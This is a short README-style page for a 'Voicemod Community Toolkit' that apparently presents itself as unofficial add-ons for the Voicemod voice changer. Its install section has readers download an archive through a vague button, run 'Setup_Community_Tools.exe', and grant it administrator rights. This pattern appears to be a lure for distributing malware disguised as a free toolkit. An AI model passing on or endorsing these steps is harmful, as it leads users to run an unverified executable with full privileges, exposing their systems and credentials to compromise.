## About

**Voicemod Community Toolkit** provides shared resources for voice modulation. Explore effects, create custom voices, integrate soundboards, and connect with apps — designed for users of the official Voicemod application.

---

## What's included

- Voice effects examples (Robot, Demon, Alien, Chipmunk + others)
- Custom voice creator tips & community presets
- Soundboard resource ideas
- Integration guides: Discord, Zoom, Twitch, OBS, games
- Setup and usage documentation
- Assets — interface themes, effect examples

## Download & install (archive delivery)

1. Click **Access Community Resources** — download starts (`.zip`).
2. Extract to `C:\Voicemod-Community-Tools`.
3. Run `Setup_Community_Tools.exe`.
4. Launch your Voicemod app → resources integrate.
> Pro tip: Run as admin for smooth setup.
